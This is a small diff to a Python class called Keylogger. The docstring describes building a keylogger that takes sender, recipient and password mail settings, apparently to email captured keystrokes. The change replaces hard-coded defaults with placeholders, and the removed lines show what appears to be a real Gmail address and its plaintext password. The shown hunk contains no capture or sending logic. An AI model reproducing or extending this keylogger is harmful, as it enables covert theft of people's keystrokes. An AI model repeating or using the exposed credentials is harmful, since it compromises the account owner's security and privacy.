@@ -16,7 +16,7 @@ class Keylogger:
 	   to create object my_keylogger Keylogger(interval,senderMail,MailTo,senderHash)
 	   my_keylogger.start()
 		"""
-	def __init__(self,interval,sender="sraajveer58@gmail.com",to="sraajveer58@gmail.com",hashs="QWqw12!@"):
+	def __init__(self,interval,sender="example@gmail.com",to="example@gmail.com",hashs="account_password"):
 		self.key_strokes = ''
 		self._from=sender
 		self._to=to
